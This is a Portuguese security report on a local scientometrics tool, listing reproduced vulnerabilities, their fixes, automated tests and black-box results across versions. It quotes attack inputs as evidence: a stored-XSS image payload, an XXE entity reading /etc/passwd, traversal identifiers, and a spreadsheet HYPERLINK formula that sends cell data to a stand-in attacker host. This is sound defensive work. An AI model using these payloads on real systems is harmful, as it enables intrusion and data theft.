# Relatório de segurança e estabilidade

Data: 10/11/2026 · Branch `feat/unificacao-cientometria` · Sem merge automático.

Princípio adotado: **uma correção só conta como feita quando um teste automatizado demonstra que o
ataque deixou de funcionar**. Por isso cada vulnerabilidade tem (1) a reprodução antes da correção,
(2) a correção, (3) o teste automatizado que tenta o ataque e (4) o risco residual. Além dos testes de
unidade/integração, um **script de caixa-preta** (`scripts/validacao_seguranca.py`) executa os ataques
pela rede, sem ler o código, e foi rodado **sem modificação** contra três versões e contra o contêiner
Docker (§3). As saídas brutas estão em `docs/evidencias/`.

Versões comparadas:

| Versão | Commit | Situação |
|---|---|---|
| Antes da revisão de segurança | `b1414c0` | estado do PR após a unificação |
| Após a rodada 2 | `8fc05f9` | 10 achados de segurança + 3 de persistência corrigidos |
| Após a rodada 3 (atual) | `d71479d` + este commit | 6 achados novos corrigidos (+ H2 no modo Docker) |

## 1. Vulnerabilidades: reprodução, correção, teste e risco residual

Severidade considerando o uso previsto (ferramenta local de pesquisa que manipula exportações
licenciadas): **Alta** = acesso a dados ou execução de código no navegador sem interação especial;
**Média** = exige condição adicional; **Baixa** = impacto limitado.

| ID | Sev. | Vulnerabilidade | Como foi reproduzida antes | Correção | Teste(s) automatizado(s) | Risco residual |
|---|---|---|---|---|---|---|
| V1 | Alta | `php -S` servia qualquer arquivo: exportações licenciadas em `projetos/`, `.git`, código | `GET /projetos/<p>/arquivos.json`, `/.git/HEAD`, `/cientometria/api.py` → 200 (caixa-preta em `b1414c0`) | `router.php` serve só os 5 pontos de entrada e o JS empacotado; `.htaccess` equivalente; Docker com dados em `/dados` | `test_seguranca.py::test_roteador_nao_serve_arquivos_internos` (10 caminhos), `::test_relatorios_so_por_caminho_valido`; caixa-preta V1 | Quem servir com outro servidor web precisa replicar a regra (`.htaccess` só cobre Apache; não testado em Apache) |
| V2 | Alta | Traversal no identificador do projeto | `{"projeto": "../projetos/<slug>"}` abria o projeto (HTTP 200) | regex `^[a-z0-9][a-z0-9-]{0,80}$` + confinamento na raiz; IDs de execução/arquivo validados | `::test_slug_invalido_rejeitado` (8 casos), `::test_id_de_execucao_invalido` (5), `::test_traversal_e_upload_pela_api`; `test_regressao.py::test_api_rejeita_entradas_invalidas`; caixa-preta V2 | — |
| V3 | Alta | CSRF: qualquer site podia acionar a API | POST `text/plain` com `Origin: http://atacante.example` criou projeto (200) | token CSRF por sessão (cookie HttpOnly, SameSite=Strict), Origin/Referer, só POST | `::test_csrf_e_origem`; caixa-preta V3 | — |
| V4 | Alta | Acesso remoto sem credenciais | GET por IP não-loopback → 200, também com `Host: localhost` falsificado | sem credenciais, só loopback; HTTP Basic (`CIENTOMETRIA_USUARIO`, `CIENTOMETRIA_SENHA_HASH`) | `::test_autenticacao_basic`; caixa-preta V4 (IP 192.0.2.2) | HTTP Basic sem TLS expõe a senha na rede: usar HTTPS (proxy reverso). Sem limite de tentativas |
| V5 | Alta | XSS armazenado: título de exportação executava JavaScript na triagem rápida | título `<img src=x onerror=…>` executou no Chromium (caixa-preta V5 em `b1414c0`) | escape em todas as interpolações; CSP `script-src 'nonce-…'`; sem handlers inline | `::test_interface_escapa_dados_dos_arquivos`, `::test_cabecalhos_de_seguranca`; `test_interface.py::test_triagem_rapida` e `::test_fluxo_completo_do_dashboard` (navegador real, nome/descrição de projeto maliciosos); caixa-preta V5 | `style-src 'unsafe-inline'` permanece (estilos inline); JS ainda inline com nonce |
| V6 | Média | Uploads e payload gravados no webroot durante o processamento | 10 arquivos observados em `tmp_uploads/` durante uma triagem (caixa-preta V6) | diretório temporário fora do webroot (0700), removido ao fim | `::test_triagem_rapida_sem_arquivos_no_webroot`; caixa-preta V6 | — |
| V7 | Média | Upload de conteúdo incompatível com a extensão | binário com nome `.csv` aceito e registrado (200) | extensão, tamanho, quantidade, bytes nulos, ZIP/OLE válidos, limite de descompactação, sem links simbólicos, importação confinada, arquivos somente leitura | `::test_conteudo_incompativel_com_extensao`, `::test_xlsx_bomba_de_compressao`, `::test_importacao_confinada_ao_diretorio_permitido`, `::test_nome_de_arquivo_saneado`, `::test_arquivo_importado_fica_somente_leitura`, `::test_traversal_e_upload_pela_api`; caixa-preta V7 | Validação é estrutural: um CSV bem formado com conteúdo hostil é aceito (e tratado como texto) |
| V8 | Média | Chart.js de CDN sem versão fixa nem SRI | `<script src="https://cdn.jsdelivr.net/npm/chart.js">` | Chart.js 4.4.1 empacotado (MIT) com SRI sha384 | `::test_biblioteca_js_local_com_sri`, `::test_roteador_serve_so_a_biblioteca_empacotada`; caixa-preta V8 | Atualizações do Chart.js passam a ser manuais |
| V9 | Média | Custo ilimitado: `n_sensibilidade` arbitrário | 10⁷ sorteios aceitos; requisição ainda processando após 60 s (caixa-preta V9) | limite de 20.000 | `::test_sensibilidade_limitada`; caixa-preta V9 | ver H6 |
| V10 | Baixa | Caminhos absolutos em mensagens de erro | `Projeto não encontrado: /tmp/…/projetos/…` | caminhos substituídos por `<…>`; erros do Python sem caminho | `::test_traversal_e_upload_pela_api` (`str(raiz) not in r.text`); caixa-preta V10 | Mensagens ainda nomeiam o tipo da exceção |
| H1 | Alta | **DNS rebinding**: site malicioso com DNS apontado para 127.0.0.1 controlava a API | `Host`/`Origin` do domínio do atacante → página 200 (com token CSRF legível) e API 200 | `Host` restrito a localhost/127.0.0.1/[::1] ou `CIENTOMETRIA_HOSTS` (HTTP 421) | `::test_dns_rebinding_host_externo_bloqueado`; caixa-preta H1 | Quem incluir um nome em `CIENTOMETRIA_HOSTS` deve usar credenciais |
| H2 | Média | Atrás de proxy reverso no mesmo host, todo cliente parecia local e dispensava senha | `X-Forwarded-For: 203.0.113.9` → 200 | cabeçalhos de proxy tornam a requisição remota; senha exigida mesmo com `CIENTOMETRIA_PERMITIR_SEM_SENHA=1` | `::test_atras_de_proxy_reverso_exige_credenciais` (4 cabeçalhos), `::test_permitir_sem_senha_nao_vale_atras_de_proxy`; caixa-preta H2 | Um proxy que não envie nenhum desses cabeçalhos não é detectado |
| H3 | Média | Triagem rápida sem a validação de conteúdo da importação | `.xlsx` com `<!DOCTYPE … SYSTEM "file:///etc/passwd">` processado (HTTP 500 após tentar ler) | mesma validação de `ingestao.validar_conteudo`; entrada rejeitada → 422 | `::test_triagem_rapida_valida_conteudo`; `test_interface.py::test_triagem_rapida`; caixa-preta H3 | — |
| H4 | Baixa | `atualizar_projeto` sem validação de tipo/tamanho/chaves | nome com 200 mil caracteres aceito (200) | tipos, tamanhos e chaves permitidas; `slug`/datas não editáveis | `::test_atualizar_projeto_valida_campos` (9 casos); caixa-preta H4 | — |
| H5 | Média | **Injeção de fórmula** no XLSX/CSV de relatório | título `=HYPERLINK("http://atacante/?d="&A2,…)` gravado como fórmula (`data_type='f'`) | células XLSX forçadas a texto (conteúdo preservado); CSVs de relatório com prefixo `'` (OWASP); `corpus.csv` bruto intacto | `::test_relatorios_sem_injecao_de_formulas`; caixa-preta H5 | O `corpus.csv` bruto (não servido pela web) mantém o texto original; abri-lo direto numa planilha exige cuidado |
| H6 | Média | Negação de serviço por arquivo pesado (bomba de descompactação válida) | `.xlsx` de 2,3 MB → 103 MB descompactados: 8 s e 262 MB por arquivo, até 50 arquivos por envio, sem teto | limites por processo: memória (`CIENTOMETRIA_MEMORIA_MAX_MB`, 6144) e tempo (`CIENTOMETRIA_TEMPO_MAX_S`, 3600) + `timeout` no PHP; descompactado ≤ 512 MiB | `::test_limites_de_recursos` (tempo e memória) | Dentro dos limites ainda é possível ocupar o servidor; sem fila nem limite de requisições simultâneas |
| P1 | Média | Importações simultâneas corrompiam `arquivos.json` | 16 processos, `b1414c0`: `JSONDecodeError` e falha da importação (via HTTP com 8 workers não se manifestou em 96 tentativas) | trava `fcntl`; temporário único + `fsync` + `rename` | `test_persistencia.py::test_importacoes_simultaneas_nao_perdem_registros` (64 em 16 processos), `::test_mesmo_arquivo_importado_em_paralelo_gera_um_registro`, `::test_criacao_simultanea_de_projetos_com_mesmo_nome`, `::test_execucoes_simultaneas_no_mesmo_projeto`; caixa-preta P1 | `fcntl` não protege sistemas de arquivos de rede sem suporte a travas (NFS antigo) |
| P2 | Média | Execução que falhava deixava resultado parcial | código; falha simulada | `.em_andamento_<id>` + renomeação atômica; `.falhas/<id>/erro.txt` | `::test_falha_durante_execucao_nao_deixa_resultado_parcial`, `::test_recuperacao_apos_queda` | — |
| P3 | Média | Execução sobre arquivo de entrada alterado; saídas sem verificação | arquivo adulterado era usado sem aviso | SHA-256 das entradas reconferido; manifesto com SHA-256 de cada saída; `verificar_execucao`, `recuperar`, `reconstruir_registro` | `::test_arquivo_original_alterado_impede_execucao`, `::test_manifesto_consistente_e_saidas_verificaveis`, `::test_registro_corrompido_e_reconstrucao`, `::test_execucao_concluida_nunca_e_sobrescrita` | Como root (fora do Docker) a cópia somente leitura pode ser alterada; a adulteração é detectada, não impedida |

**Hipóteses testadas e não confirmadas** (mantidas como teste de regressão): XXE e "billion laughs" em `.xlsx`
— rejeitados pelo leitor; reforço: `.xlsx` com `DOCTYPE` recusado e `defusedxml` instalado
(`::test_xlsx_com_doctype_rejeitado`). Injeção de comando nos `exec()` do PHP — todos os argumentos passam por
`escapeshellarg`; `bandit` sem achados.

## 2. Evidências dos testes automatizados após as correções

Execução local completa após as correções (`docs/evidencias/testes_locais.txt`):

```
Execução local: 2026-11-10T18:50:34.524028+00:00 — 172 testes, falhas=0, erros=0, pulados=26, tempo=92s
  test_adaptador_dashboard         passou=  8 pulado=  0 falhou=  0
  test_bibliometria                passou=  8 pulado=  0 falhou=  0
  test_comparacao_r                passou=  0 pulado= 20 falhou=  0
  test_consolidacao                passou=  7 pulado=  0 falhou=  0
  test_dados_reais                 passou=  0 pulado=  6 falhou=  0
  test_equivalencia_original       passou=  3 pulado=  0 falhou=  0
  test_ingestao                    passou= 13 pulado=  0 falhou=  0
  test_interface                   passou=  2 pulado=  0 falhou=  0
  test_modos_e_robustez            passou=  9 pulado=  0 falhou=  0
  test_persistencia                passou= 12 pulado=  0 falhou=  0
  test_projetos_manifesto          passou=  8 pulado=  0 falhou=  0
  test_regressao                   passou= 17 pulado=  0 falhou=  0
  test_seguranca                   passou= 58 pulado=  0 falhou=  0
  test_volume                      passou=  1 pulado=  0 falhou=  0
```

Dentro do contêiner (Python 3.11, PHP 8.3, usuário sem privilégios, código somente leitura): `144 passed, 28 skipped` (`docs/evidencias/testes_no_conteiner.txt`; os 2 testes de interface são pulados porque a imagem de produção não inclui navegador).

Com dados reais não versionados (`docs/evidencias/testes_dados_reais.txt`): 22 passaram (comparação com o R e
consistência do corpus publicado) — os resultados científicos não mudaram com as correções. Os 4 testes com as
exportações originais continuam pulados (arquivos indisponíveis).

Verificações estáticas: `ruff` sem achados; `bandit` sem achados (0 em ~3,4 mil linhas); `pip-audit` sem
vulnerabilidades conhecidas na árvore completa de dependências; `php -l` sem erros; arquivos congelados do modo original inalterados.

## 3. Validação em caixa-preta (mesmo script nas três versões e no Docker)

Script: `scripts/validacao_seguranca.py` (SHA-256 em `docs/evidencias/validacao_seguranca.sha256`), executado
**sem modificação** em cada versão, servidor `php -S` com 8 workers e configuração padrão (projetos dentro
da pasta da aplicação), acesso remoto testado por IP não-loopback (192.0.2.2). Saídas completas:
`docs/evidencias/validacao_<versão>.txt|json`.

| ID | Vulnerabilidade | `b1414c0` (antes da revisão) | `8fc05f9` (após rodada 2) | `atual` (após rodada 3) | `docker` (Docker (atual)) |
|---|---|---|---|---|---|
| V1 | Arquivos internos servidos (projetos/, .git, código) | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V2 | Path traversal no identificador do projeto | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V3 | CSRF / origem não verificada | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V4 | Acesso remoto sem credenciais | **EXPLORÁVEL** | bloqueado | bloqueado | n/a |
| V5 | XSS armazenado via título de exportação | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V6 | Uploads gravados no webroot | **EXPLORÁVEL** | bloqueado | bloqueado | n/a |
| V7 | Upload de conteúdo incompatível com a extensão | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V8 | Script de CDN sem versão fixa/SRI | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V9 | Sorteios de sensibilidade sem limite | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| V10 | Caminhos absolutos em mensagens de erro | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| H1 | DNS rebinding (Host do atacante) | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| H2 | Proxy reverso local dispensa senha | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| H3 | Triagem rápida sem validação de conteúdo | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| H4 | Metadados do projeto sem validação | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| H5 | Injeção de fórmula no XLSX do relatório | **EXPLORÁVEL** | **EXPLORÁVEL** | bloqueado | bloqueado |
| P1 | Importações simultâneas corrompem o registro | **EXPLORÁVEL** | bloqueado | bloqueado | bloqueado |
| | **Total explorável** | **16** | **5** | **0** | **0** |

Observações:
- V4 no Docker: a porta é publicada só em 127.0.0.1 do host; pelo IP externo a conexão é recusada (`validacao_docker_v4.txt`).
- V6 no Docker: não se aplica (código em `/app` somente leitura; uploads em `/tmp`, tmpfs).
- P1: na versão antiga, 2 de 96 importações simultâneas falharam via HTTP; com 16 processos diretos, o registro
  JSON ficou ilegível. O Docker usa 1 worker PHP (concorrência serializada), por isso P1 é demonstrado no `php -S` com 8 workers e nos testes de processo.
- Evidência do V10 na versão antiga: a mensagem de erro continha `/tmp/claude-0/…/projetos/…`.

## 4. Regressão funcional

| Área | O que é verificado | Testes |
|---|---|---|
| Importação | 8 formatos, detecção de base, codificação, linhas ruins, entradas incompletas, ausência de DOI, retrato da importação (tipos, rótulos, contagens, SHA-256, cobertura de campos) | `test_ingestao.py` (13), `test_regressao.py::test_importacao_inalterada` (2) |
| Processamento | 4 modos × 2 cenários sintéticos: contagens, estratos, top 10, soma dos escores e hash do corpus idênticos ao retrato; modo original = scripts de referência; volume de 60 mil registros | `test_regressao.py::test_processamento_inalterado` (8), `test_equivalencia_original.py` (3), `test_modos_e_robustez.py` (9), `test_consolidacao.py` (7), `test_volume.py` |
| Persistência | concorrência, falha e queda simuladas, adulteração, recuperação, manifestos | `test_persistencia.py` (12), `test_projetos_manifesto.py` (8) |
| API | contrato de todas as ações e rejeição de entradas inválidas (Python); contrato JSON do adaptador; HTTP real com CSRF | `test_regressao.py::test_contrato_api`, `::test_api_rejeita_entradas_invalidas` (5), `test_adaptador_dashboard.py` (8), `test_seguranca.py` (HTTP) |
| Interface | Chromium real com o CSP ativo: fluxo completo do dashboard (criar projeto com nome malicioso, importar, diagnosticar, executar 2 modos, comparar modos, bibliometria e gráficos, comparar execuções, reproduzir, baixar relatório) e triagem rápida (execução, título malicioso, arquivo inválido); zero erros de JavaScript/CSP | `test_interface.py` (2) |

O retrato do processamento (`tests/regressao/esperado.json`) usa dados sintéticos e não valida a reprodução do artigo.

## 5. Riscos residuais (consolidado)

1. **Sem TLS próprio**: para acesso remoto, colocar atrás de proxy HTTPS e configurar credenciais.
2. **Sem limite de tentativas de senha nem de taxa de requisições**.
3. **Negação de serviço dentro dos limites**: processos longos ainda ocupam o servidor; não há fila.
4. **CSP com `style-src 'unsafe-inline'`** e JavaScript inline (com nonce).
5. **`.htaccess` não testado** em Apache; o caminho suportado é `php -S … router.php` ou o Docker.
6. **Revisão por terceiros**: esta validação foi feita pelo mesmo agente que implementou as correções; o script
   de caixa-preta reduz, mas não elimina, esse viés. Recomenda-se revisão humana independente.
7. **Dados reais**: testes com as exportações originais não foram executados (arquivos indisponíveis).
8. **Pacotes ZIP sem assinatura** (Z6): integridade verificável, autenticidade não; arquivos restaurados são
   guardados sem sanitização (Z5).

## 6. Como repetir

```bash
python -m pytest -q
```

```bash
php -S 127.0.0.1:8000 router.php &
python scripts/validacao_seguranca.py --base http://127.0.0.1:8000
```

## 7. Pacote ZIP de execução (superfície nova, rodada 4)

A importação de pacotes (`docs/EXPORTACAO_EXECUCOES.md`) aceita um arquivo compactado vindo de fora.
As ameaças foram tratadas antes da publicação. Cada linha tem teste automatizado em `tests/test_pacote.py`
(dados sintéticos).

| ID | Ameaça | Controle | Teste(s) | Risco residual |
|---|---|---|---|---|
| Z1 | Path traversal / escrita fora do destino (`../`, absoluto, `\`, `C:/`, NUL, componentes vazios) | nomes validados contra a estrutura fixa antes de qualquer leitura; extração revalida, confina ao destino e grava com `open(…, "xb")` | `test_07_path_traversal` (10), `test_07c_extracao_nunca_escapa_do_destino` | — |
| Z2 | Link simbólico, dispositivo ou FIFO dentro do ZIP; pacote enviado como link | bits de tipo em `external_attr` (só arquivo regular ou sem tipo); `is_symlink()` na origem | `test_07b_link_simbolico_e_arquivo_especial` | — |
| Z3 | Zip bomb e esgotamento de disco | razão de compressão ≤ 200 (acima de 1 MiB), total descompactado ≤ 4096 MiB, ≤ 5.000 entradas, ZIP ≤ 512 MiB; leitura em blocos que nunca passa do tamanho declarado; limites de memória e tempo do processo (H6) | `test_06_zip_bomb`, `test_06b_tamanho_declarado_falso_nao_engana_a_leitura` | Um pacote dentro dos limites ainda ocupa disco (até ~4 GiB) e tempo |
| Z4 | ZIP malformado (truncado, CRC errado, deflate inválido, criptografado, duplicatas, inclusive só na caixa) | recusado com `PacoteInvalido`. **Achado durante o desenvolvimento**: dado deflate corrompido levantava `zlib.error`, que escapava da conversão. Reproduzido pelo teste, corrigido em `_ler_limitado` | `test_05_zip_invalido_ou_malformado` | — |
| Z5 | Conteúdo executável ou fora do esperado (scripts, HTML, arquivos de outra execução) | estrutura fixa com extensões permitidas por área; arquivo não listado no manifesto = problema; nada do pacote é executado, importado como código ou aberto (planilhas restauradas não são lidas) | `test_08_arquivos_inesperados` | Os arquivos de resultado restaurados são guardados byte a byte, sem sanitização (é o que preserva a integridade). Um pacote hostil pode trazer, por exemplo, um CSV de relatório com fórmula. `arquivo.php` serve tudo, exceto PNG, como download (`attachment`, `nosniff`), e a interface escapa todo dado exibido |
| Z6 | Resultados adulterados (arquivo ausente, alterado, hash errado, adulteração coerente do arquivo e do manifesto do pacote) | SHA-256 de cada arquivo na inspeção e na extração; conferência contra `saidas_sha256` e o hash do corpus do manifesto da **execução** | `test_02_…`, `test_03_…`, `test_04_…`, `test_04b_adulteracao_coerente_…` | **Sem assinatura**: quem reescreve resultado, manifesto da execução e manifesto do pacote de forma consistente produz um pacote coerente. Autenticidade depende da fonte e do SHA-256 informado por quem exportou |
| Z7 | Sobrescrever uma execução existente reaproveitando o ID | sob trava: ID existente com conteúdo diferente = recusa; idêntico = `ja_existia` | `test_13b_mesmo_id_com_conteudo_diferente_e_recusado` | — |
| Z8 | Caminho arbitrário via API (`caminho`, `destino` no JSON) | PHP remove os campos; o upload só chega pelo campo `pacote` (`.zip`); Python confina a `CIENTOMETRIA_DIR_IMPORTACAO`/`_EXPORTACAO`; token por regex; nome do download por regex | `test_exportacao_e_recebimento_confinados`, `test_endpoints_php` | — |
| Z9 | Corridas e quedas (restauração simultânea, interrupção no meio) | pasta temporária invisível + renomeação atômica sob `_trava`; `recuperar()` remove temporários | `test_13_importacoes_concorrentes`, `test_14_…`, `test_14b_…` | `fcntl` em NFS antigo (como P1) |
| Z10 | Vazamento de dados licenciados pelo pacote | exportar sem entradas (só SHA-256); aviso na interface; `*.zip` no `.gitignore`; `verificar_repositorio.py` falha com `.zip` versionado | `test_09_dados_originais_omitidos` | A opção "incluir entradas" vem marcada (pacote completo); a decisão de compartilhar é de quem exporta |
| Z11 | CSRF/origem no upload e no download | `seg_exigir_post_protegido()` em `api.php` para todas as ações novas | `test_endpoints_php` (sem token → 403) | — |
